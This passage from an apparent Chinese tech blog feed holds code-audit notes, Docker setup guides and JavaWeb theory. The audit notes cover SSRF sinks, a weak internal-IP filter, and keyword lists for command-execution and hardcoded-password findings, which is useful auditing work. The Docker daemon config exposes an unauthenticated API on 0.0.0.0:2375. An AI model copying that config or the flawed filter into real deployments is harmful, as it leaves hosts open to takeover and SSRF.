class="hljs-comment">// send request</span></code></pre></div><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><div class="code-wrapper"><pre><code class="hljs java">Request.Get(url).execute();</code></pre></div><h3 id="CloseableHttpClient"><a href="#CloseableHttpClient" class="headerlink" title="CloseableHttpClient"></a>CloseableHttpClient</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> HttpClients.createDefault();<span class="hljs-type">HttpGet</span> <span class="hljs-variable">httpGet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpGet</span>(url);client.execute(httpGet); <span class="hljs-comment">// send request</span></code></pre></div><h3 id="HttpURLConnection"><a href="#HttpURLConnection" class="headerlink" title="HttpURLConnection"></a>HttpURLConnection</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> u.openConnection();<span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">httpUrl</span> <span class="hljs-operator">=</span> (HttpURLConnection) urlConnection;httpUrl.getInputStream(); <span class="hljs-comment">//send request</span></code></pre></div><h3 id="OkHttpClient"><a href="#OkHttpClient" class="headerlink" title="OkHttpClient"></a>OkHttpClient</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>();<span class="hljs-comment">// client.setFollowRedirects(false);</span>com.squareup.okhttp.<span class="hljs-type">Request</span> <span class="hljs-variable">ok_http</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.squareup.okhttp.Request.Builder().url(url).build();client.newCall(ok_http).execute().body().string();</code></pre></div><h3 id="ImageIO"><a href="#ImageIO" class="headerlink" title="ImageIO"></a>ImageIO</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);ImageIO.read(u); <span class="hljs-comment">// send request</span></code></pre></div><h3 id="IOUtils"><a href="#IOUtils" class="headerlink" title="IOUtils"></a>IOUtils</h3><div class="code-wrapper"><pre><code class="hljs java">IOUtils.toByteArray(URI.create(url));</code></pre></div><h3 id="Jsoup"><a href="#Jsoup" class="headerlink" title="Jsoup"></a>Jsoup</h3><div class="code-wrapper"><pre><code class="hljs jboss-cli">Document doc = Jsoup.<span class="hljs-keyword">connect</span><span class="hljs-params">(url)</span>        <span class="hljs-string">.timeout</span><span class="hljs-params">(3000)</span>        <span class="hljs-string">.cookie</span><span class="hljs-params">(&quot;name&quot;, &quot;joychou&quot;)</span> <span class="hljs-string">//</span> request cookies        <span class="hljs-string">.execute</span><span class="hljs-params">()</span><span class="hljs-string">.parse</span><span class="hljs-params">()</span>;</code></pre></div><h2 id="关键接口"><a href="#关键接口" class="headerlink" title="关键接口"></a>关键接口</h2><div class="code-wrapper"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.URLConnection</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.httpclient</span><span class="hljs-selector-class">.HttpClient</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.httpclient</span><span class="hljs-selector-class">.methods</span><span class="hljs-selector-class">.GetMethod</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.http</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.fluent</span><span class="hljs-selector-class">.Request</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.http</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.CloseableHttpClient</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.http</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.methods</span><span class="hljs-selector-class">.HttpGet</span>java<span class="hljs-selector-class">.net</span><span class="hljs-selector-class">.HttpURLConnection</span>com<span class="hljs-selector-class">.squareup</span><span class="hljs-selector-class">.okhttp</span><span class="hljs-selector-class">.OkHttpClient</span>javax<span class="hljs-selector-class">.imageio</span><span class="hljs-selector-class">.ImageIO</span>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.IOUtils</span>org<span class="hljs-selector-class">.jsoup</span>.Jsoup</code></pre></div><h2 id="关键字-3"><a href="#关键字-3" class="headerlink" title="关键字"></a>关键字</h2><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-class">.openConnection</span>(<span class="hljs-selector-class">.getInputStream</span>(<span class="hljs-selector-class">.executeMethod</span>(<span class="hljs-selector-class">.execute</span>(ImageIO<span class="hljs-selector-class">.read</span>(Jsoup<span class="hljs-selector-class">.connect</span>(</code></pre></div><h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><h3 id="白名单校验URL及IP"><a href="#白名单校验URL及IP" class="headerlink" title="白名单校验URL及IP"></a>白名单校验URL及IP</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment">     2 * 判断一个URL的IP是否是内网IP</span><span class="hljs-comment">     3 * 如果是内网IP，返回true</span><span class="hljs-comment">     4 * 非内网IP，返回false</span><span class="hljs-comment">     5 */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInnerIpFromUrl</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">domain</span> <span class="hljs-operator">=</span> getUrlDomain(url);        <span class="hljs-keyword">if</span> (domain.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 异常URL当成内网IP等非法URL处理</span>            &#125;         ip = DomainToIP(domain);        <span class="hljs-keyword">if</span>(ip.equals(<span class="hljs-string">&quot;&quot;</span>))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 如果域名转换为IP异常，则认为是非法URL</span>            <span class="hljs-number">15</span> &#125;        <span class="hljs-keyword">return</span> isInnerIp(ip);        &#125;    <span class="hljs-comment">/**</span><span class="hljs-comment">     *</span><span class="hljs-comment">    * 内网IP：</span><span class="hljs-comment">     * 10.0.0.1 - 10.255.255.254 (10.0.0.0/8)</span><span class="hljs-comment">     * 192.168.0.1 - 192.168.255.254 (192.168.0.0/16)</span><span class="hljs-comment">     * 127.0.0.1 - 127.255.255.254 (127.0.0.0/8)</span><span class="hljs-comment">     * 172.16.0.1 - 172.31.255.254 (172.16.0.0/12)</span><span class="hljs-comment">    */</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInnerIp</span><span class="hljs-params">(String strIP)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-keyword">try</span> &#123;            String[] ipArr = strIP.split(<span class="hljs-string">&quot;\\\\\\\\.&quot;</span>);            <span class="hljs-keyword">if</span> (ipArr.length != <span class="hljs-number">4</span>) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-type">int</span> <span class="hljs-variable">ip_split1</span> <span class="hljs-operator">=</span> Integer.parseInt(ipArr[<span class="hljs-number">1</span>]);            <span class="hljs-keyword">return</span> (ipArr[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;10&quot;</span>) || ipArr[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;127&quot;</span>) || (ipArr[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;172&quot;</span>) &amp;&amp; ip_split1 &gt;= <span class="hljs-number">16</span> &amp;&amp; ip_split1 &lt;= <span class="hljs-number">31</span>) ||                    (ipArr[<span class="hljs-number">0</span>].equals(<span class="hljs-string">&quot;192&quot;</span>) &amp;&amp; ipArr[<span class="hljs-number">1</span>].equals(<span class="hljs-string">&quot;168&quot;</span>)));        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;</code></pre></div><h3 id="限制协议与端口"><a href="#限制协议与端口" class="headerlink" title="限制协议与端口"></a>限制协议与端口</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 从URL中获取域名</span><span class="hljs-comment"> * 限制为http/https协议</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getUrlDomain</span><span class="hljs-params">(String url)</span> <span class="hljs-keyword">throws</span> IOException&#123;    <span class="hljs-keyword">try</span> &#123;        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);        <span class="hljs-keyword">if</span> (!u.getProtocol().startsWith(<span class="hljs-string">&quot;http&quot;</span>) &amp;&amp; !u.getProtocol().start        <span class="hljs-title function_">sWith</span><span class="hljs-params">(<span class="hljs-string">&quot;https&quot;</span>)</span>) &#123;            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Protocol error: &quot;</span> + u.getProtocol());        &#125;        <span class="hljs-keyword">return</span> u.getHost();    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;    &#125;&#125;</code></pre></div><h1 id="代码-命令执行"><a href="#代码-命令执行" class="headerlink" title="代码|命令执行"></a>代码|命令执行</h1><h2 id="OS命令注入"><a href="#OS命令注入" class="headerlink" title="OS命令注入"></a>OS命令注入</h2><div class="code-wrapper"><pre><code class="hljs smali">Systemexecpassthrupopenshell_execevalpreg_replacestr_replacecall_user_funcgetRuntime().exec<span class="hljs-keyword"></span><span class="hljs-keyword">system</span>execlpexecvpShellExecutewsystempopen(getRuntimeProcessBuilderexecfileinputShellShellExecuteForExplore(ShellExecute<span class="hljs-built_in"></span><span class="hljs-built_in">execute</span><span class="hljs-built_in"></span><span class="hljs-keyword">.exec</span>/bin/sh、/bin/bashcmd</code></pre></div><h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p><strong>Velocity</strong></p><div class="code-wrapper"><pre><code class="hljs"></code></pre></div><p><strong>Freemarker</strong></p><div class="code-wrapper"><pre><code class="hljs stylus">freemarker<span class="hljs-selector-class">.template</span><span class="hljs-selector-class">.Template</span><span class="hljs-selector-class">.process</span>freemarker<span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.Environment</span><span class="hljs-selector-class">.process</span>freemarker<span class="hljs-selector-class">.template</span><span class="hljs-selector-class">.TemplateMethodModel</span><span class="hljs-selector-class">.exec</span>freemarker<span class="hljs-selector-class">.template</span><span class="hljs-selector-class">.utility</span><span class="hljs-selector-class">.Execute</span>.exec</code></pre></div><h2 id="表达式注入"><a href="#表达式注入" class="headerlink" title="表达式注入"></a>表达式注入</h2><p><strong>OGNL</strong></p><div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-keyword">import</span> ognl.*</code></pre></div><p><strong>SPEL</strong></p><div class="code-wrapper"><pre><code class="hljs abnf">org.springframework.expressionparseExpressiongetValuegetValueType<span class="hljs-attribute">value</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;#&#123;*&#125;</span></code></pre></div><h1 id="硬编码"><a href="#硬编码" class="headerlink" title="硬编码"></a>硬编码</h1><div class="code-wrapper"><pre><code class="hljs pgsql">pass<span class="hljs-keyword">password</span>pwdpasswdpswdkeysharekeycheckpwdcryptocardnoPINNUMBER<span class="hljs-keyword">admin</span>DEFAULT_PWD<span class="hljs-keyword">PASSWORD</span>keysharekeyencryptenc<span class="hljs-type">dec</span>decrypt<span class="hljs-keyword">user</span><span class="hljs-keyword">admin</span><span class="hljs-keyword">operator</span><span class="hljs-keyword">login</span><span class="hljs-type">name</span>root</code></pre></div><h1 id="日志打印漏洞"><a href="#日志打印漏洞" class="headerlink" title="日志打印漏洞"></a>日志打印漏洞</h1><div class="code-wrapper"><pre><code class="hljs lua"><span class="hljs-built_in">log</span>.<span class="hljs-built_in">debug</span><span class="hljs-built_in">log</span>.<span class="hljs-built_in">error</span><span class="hljs-built_in">log</span>.info<span class="hljs-built_in">log</span>.warnlogger.severelogger.<span class="hljs-built_in">error</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dockerfile</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Docker/dockerfile/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/Docker/dockerfile/</url>
    
    <content type="html"><![CDATA[<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><p>功能：构建单个镜像</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><table><thead><tr><th>指令名</th><th>功能</th></tr></thead><tbody><tr><td>FROM</td><td>指定基础镜像名称</td></tr><tr><td>LABEL</td><td>指定镜像的元数据信息，格式为key1&#x3D;value1,key2&#x3D;value2,…</td></tr><tr><td>WORKDIR</td><td>为Dockerfile文件中所有CMD&#x2F;RUN&#x2F;COPY&#x2F;ADD指定工作目录</td></tr><tr><td>ADD</td><td>拷贝本机文件或者远程文件到镜像内（会自动解压）</td></tr><tr><td>COPY</td><td>拷贝本机文件到镜像内</td></tr><tr><td>ARG</td><td>定义一个变量。格式为变量名&#x3D;变量值</td></tr><tr><td>RUN</td><td>镜像构建需要执行的具体命令，类似Linux命令行执行命令</td></tr><tr><td>VOLUME</td><td>设置挂载点,创建时会自动分配本地一个随机路径进行挂载，无法指定路径</td></tr><tr><td>ENTRYPOINT</td><td>容器启动执行的命令</td></tr><tr><td>CMD</td><td>为ENTRYPOINT指令提供默认参数，也可以单独使用CMD指定容器启动参数</td></tr><tr><td>ENV</td><td>指定容器运行时的环境变量，格式为key&#x3D;value</td></tr><tr><td>EXPOSE</td><td>容器对外的端口</td></tr><tr><td>USER</td><td>指定容器启动的用户（默认为root用户）</td></tr></tbody></table><p><strong>set -ex</strong>：shell脚本命令，-e当脚本执行出错时停止执行，-x执行每行命令时，输出一个带“+”号的提示信息</p><h2 id="构建自定义镜像"><a href="#构建自定义镜像" class="headerlink" title="构建自定义镜像"></a>构建自定义镜像</h2><div class="code-wrapper"><pre><code class="hljs bash">docker build -f DockerfileName -t ImageName:TagName .such as:docker build -f Dockerfile  -t MyCentOS:v1.0 .</code></pre></div><p>参考：<a href="https://www.cnblogs.com/ysocean/p/15659105.html">https://www.cnblogs.com/ysocean/p/15659105.html</a></p>]]></content>
    
    
    <categories>
      
      <category>软件教程</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker安装</title>
    <link href="/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/docker/"/>
    <url>/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/docker/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="RPM包安装"><a href="#RPM包安装" class="headerlink" title="RPM包安装"></a>RPM包安装</h2><p>卸载旧版本</p><div class="code-wrapper"><pre><code class="hljs axapta">yum remove docker docker-<span class="hljs-keyword">client</span> docker-<span class="hljs-keyword">client</span>-latest docker-<span class="hljs-keyword">common</span> docker-latest docker-latest-logrotate docker-logrotate docker-engine</code></pre></div><p>安装依赖</p><div class="code-wrapper"><pre><code class="hljs gml">yum install -<span class="hljs-variable language_">y</span> yum-utils device-mapper-<span class="hljs-variable language_">persistent</span>-data lvm2</code></pre></div><p>设置镜像源</p><div class="code-wrapper"><pre><code class="hljs vim">yum-config-manager --<span class="hljs-built_in">add</span>-repo https://mirrors.aliyun.<span class="hljs-keyword">com</span>/docker-<span class="hljs-keyword">ce</span>/linux/centos/docker-<span class="hljs-keyword">ce</span>.repo</code></pre></div><p>安装</p><div class="code-wrapper"><pre><code class="hljs vim">yum makecache fastyum install docker-<span class="hljs-keyword">ce</span> docker-<span class="hljs-keyword">ce</span>-cli containerd.io</code></pre></div><p>启动</p><div class="code-wrapper"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl start docker<span class="hljs-params">system</span>ctl enable docker</code></pre></div><h2 id="二进制安装"><a href="#二进制安装" class="headerlink" title="二进制安装"></a>二进制安装</h2><p>下载地址：<a href="https://download.docker.com/linux/static/stable/x86_64/docker-23.0.2.tgz">https://download.docker.com/linux/static/stable/x86_64/docker-23.0.2.tgz</a></p><p><strong>安装</strong></p><div class="code-wrapper"><pre><code class="hljs gradle">mkdir -p <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/docker/</span>data <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/docker/</span>exec <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/docker/</span>log <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/docker/</span>configtar -xf docker-<span class="hljs-number">23.0</span>.<span class="hljs-number">2</span>.tgz -C <span class="hljs-regexp">/usr/</span>local/dockermv <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/docker/</span>docker <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/docker/</span>binecho <span class="hljs-string">&quot;export PATH=/usr/local/docker/bin:$PATH&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>profileecho <span class="hljs-string">&quot;export DOCKER_HOST=unix:///usr/local/docker/exec/docker.sock&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>profile<span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile</code></pre></div><p><strong>创建配置文件</strong></p><div class="code-wrapper"><pre><code class="hljs pgsql">cat <span class="hljs-symbol">&lt;&lt; EOF &gt;&gt;</span> /usr/<span class="hljs-keyword">local</span>/docker/config/daemon.json&#123;    &quot;data-root&quot;: &quot;/usr/local/docker/data&quot;,    &quot;exec-root&quot;: &quot;/usr/local/docker/exec&quot;,    &quot;hosts&quot;: [      &quot;unix:///usr/local/docker/exec/docker.sock&quot;,      &quot;tcp://0.0.0.0:2375&quot;    ],    &quot;pidfile&quot;: &quot;/usr/local/docker/exec/docker.pid&quot;,    &quot;registry-mirrors&quot;: [        &quot;https://docker.1ms.run&quot;,        &quot;https://doublezonline.cloud&quot;,        &quot;https://dislabaiot.xyz&quot;,        &quot;https://docker.fxxk.dedyn.io&quot;,        &quot;https://dockerpull.org&quot;,        &quot;https://docker.unsee.tech&quot;,        &quot;https://hub.rat.dev&quot;,        &quot;https://docker.1panel.live&quot;,        &quot;https://docker.nastool.de&quot;,        &quot;https://docker.zhai.cm&quot;,        &quot;https://docker.5z5f.com&quot;,        &quot;https://a.ussh.net&quot;,        &quot;https://docker.udayun.com&quot;,        &quot;https://hub.geekery.cn&quot;    ]&#125;EOF</code></pre></div><p><strong>启动守护进程</strong></p><div class="code-wrapper"><pre><code class="hljs gradle">dockerd --config-<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/docker/</span>config/daemon.json</code></pre></div><p>即可使用docker</p><h1 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker-compose"></a>Docker-compose</h1><div class="code-wrapper"><pre><code class="hljs awk">curl -L https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/docker/</span>compose<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v2.16.0/</span>docker-compose-`uname -s`-`uname -m` -o <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-composechmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>软件安装</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb理论</title>
    <link href="/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/JavaWeb%E7%90%86%E8%AE%BA/"/>
    <url>/%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF/JavaWeb/JavaWeb%E7%90%86%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="MVC设计模式"><a href="#MVC设计模式" class="headerlink" title="MVC设计模式"></a>MVC设计模式</h1><p>MVC模式（Model-View-Controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分。</p><p>Model称为模型，也就是实体类。用于数据的封装和数据的传输。如Service、Dao、JavaBean等</p><p>View为视图，也就是GUI组件，用于数据的展示。采用的技术有HTML、JSP、前端框架等</p><p>Controller为控制器，也就是事件，用于事件流程的控制。采用的技术有Servlet、Filter等</p><h1 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h1><h2 id="业务层"><a href="#业务层" class="headerlink" title="业务层"></a>业务层</h2><p>也叫<strong>逻辑层</strong>，<strong>service层</strong>。采用事务脚本模式，将一个业务中所有的操作封装成一个方法，同时保证方法中所有的数据库更新操作，即保证同时成功或同时失败。避免部分成功部分失败引起的数据混乱操作。</p><h2 id="表现层"><a href="#表现层" class="headerlink" title="表现层"></a>表现层</h2><p>也叫<strong>web层</strong>。包含JSP，Servlet等web相关的内容。</p><h2 id="持久层"><a href="#持久层" class="headerlink" title="持久层"></a>持久层</h2><p>也叫<strong>数据层</strong>。采用DAO模式，建立实体类和数据库表映射（ORM映射）。也就是哪个类对应哪个表，哪个属性对应哪个列。持久层的目的是完成对象数据和关系数据的转换。</p><h2 id="主流开发框架"><a href="#主流开发框架" class="headerlink" title="主流开发框架"></a>主流开发框架</h2><h3 id="SSH框架"><a href="#SSH框架" class="headerlink" title="SSH框架"></a>SSH框架</h3><ul><li>Spring——业务层</li><li>Struts——表现层</li><li>Hibernate——持久层</li></ul><h3 id="SSM框架"><a href="#SSM框架" class="headerlink" title="SSM框架"></a>SSM框架</h3><ul><li>Spring——业务层</li><li>SpringMVC——表现层</li><li>MyBatis——持久层</li></ul><h2 id="三层架构与MVC模式的关系"><a href="#三层架构与MVC模式的关系" class="headerlink" title="三层架构与MVC模式的关系"></a>三层架构与MVC模式的关系</h2><p>两者并无直接的关联。</p><p>web层（表现层）相当于MVC中的View。</p><p>service层和dao层相当于MVC中的Model。</p><h1 id="三大组件"><a href="#三大组件" class="headerlink" title="三大组件"></a>三大组件</h1><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>用于监听Web应用程序中的ServletContext，HttpSession 和HttpServletRequest等域对象在其生命周期内改变的事件，如实例的创建与销毁，属性发生修改等</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>Listener对象</strong>：实现了EventListener接口或实现其子接口或继承其子接口的实现类的java类</p><h3 id="Listener接口"><a href="#Listener接口" class="headerlink" title="Listener接口"></a>Listener接口</h3><div class="code-wrapper"><pre><code class="hljs angelscript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-symbol">EventListener</span> &#123;&#125;</code></pre></div><h3 id="常用Listener"><a href="#常用Listener" class="headerlink" title="常用Listener"></a>常用Listener</h3><p><strong>监听三个域对象的创建和销毁的监听器</strong></p><p>ServletContextListener HttpSessionListener ServletRequestListener</p><p><strong>监听三个域对象的属性变更的监听器</strong></p><p>ServletContextAttributeListener HttpSessionAttributeListener ServletRequestAttributeListener</p><p><strong>监听HttpSession中的JavaBean的状态改变</strong></p><p>HttpSessionBindingListener HttpSessionActivationListener</p><h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>拦截请求，对sevlet要处理的数据做一些前置处理</p><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>Filter对象：由servlet容器创建，filter对象是实现了Filter接口或继承了其实现类的java类</p><p>FilterConfig：由servlet容器创建，在servlet容器初始化一个filter对象时，作为参数传递，以获取filter的信息</p><h3 id="Filter接口"><a href="#Filter接口" class="headerlink" title="Filter接口"></a>Filter接口</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Filter</span> &#123;    <span class="hljs-keyword">default</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;&#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,FilterChain chain)</span>            <span class="hljs-keyword">throws</span> IOException, ServletException;    <span class="hljs-keyword">default</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;&#125;&#125;</code></pre></div><p><strong>FilterAPI</strong></p><table><thead><tr><th>方法名</th><th>功能</th><th>调用</th></tr></thead><tbody><tr><td>init</td><td>加载Filter的配置信息（filter类名，filter映射等）</td><td>在web容器（tomcat）创建filter对象后调用</td></tr><tr><td>doFilter</td><td>在servlet处理请求之前执行一些操作的方法</td><td></td></tr><tr><td>destroy</td><td>销毁filter</td><td>停止web容器前调用</td></tr></tbody></table><h3 id="常用Filter"><a href="#常用Filter" class="headerlink" title="常用Filter"></a>常用Filter</h3><p>GenericFilter</p><p>HttpFilter</p><h3 id="生命周期-1"><a href="#生命周期-1" class="headerlink" title="生命周期"></a>生命周期</h3><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><h3 id="基础知识-2"><a href="#基础知识-2" class="headerlink" title="基础知识"></a>基础知识</h3><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>接收客户端发送过来的请求进行处理，并响应数据给客户端</p><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p><strong>web容器&#x2F;servlet容器</strong>：运行web应用的服务器。一般指tomcat等</p><p><strong>servlet对象</strong>：由servlet容器创建，servlet对象是实现了Servlet接口或继承了其实现类的java类</p><p><strong>ServletContext</strong>：由servlet容器创建，用于servlet对象与servlet容器进行通信，servlet对象可以获取servlet容器中的信息资源。</p><p>Servlet容器在启动一个Web应用时，会为它创建一个ServletContext对象。每个web应用有唯一的ServletContext对象。同一个web应用的所有servlet对象共享一个ServletContext。</p><p><strong>ServletConfig</strong>：由servlet容器创建，servlet容器初始化一个servlet对象时，将servletconfig对象传递给该对象</p><p><strong>ServletRequest</strong>：由servlet容器创建，其封装了客户端向servlet对象发送的请求信息，作为servlet对象的service方法的参数 <strong>ServletResponse</strong>：由servlet容器创建，其封装了servlet对象向客户端发送的响应信息，作为servlet对象的service方法的参数</p><h3 id="Servlet接口"><a href="#Servlet接口" class="headerlink" title="Servlet接口"></a>Servlet接口</h3><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Servlet</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException;    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException;    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span>;&#125;</code></pre></div><p><strong>servletAPI</strong></p><table><thead><tr><th>方法名</th><th>功能</th><th>调用</th></tr></thead><tbody><tr><td>init</td><td>加载servlet的配置信息（servlet类名，servlet映射等）</td><td>第一次访问servlet时调用</td></tr><tr><td>service</td><td>处理客户端发来的请求，并响应数据给客户端</td><td>每次发送请求时调用</td></tr><tr><td>destroy</td><td>销毁servlet</td><td>停止web容器（tomcat等）前调用</td></tr></tbody></table><h3 id="常用Servlet"><a href="#常用Servlet" class="headerlink" 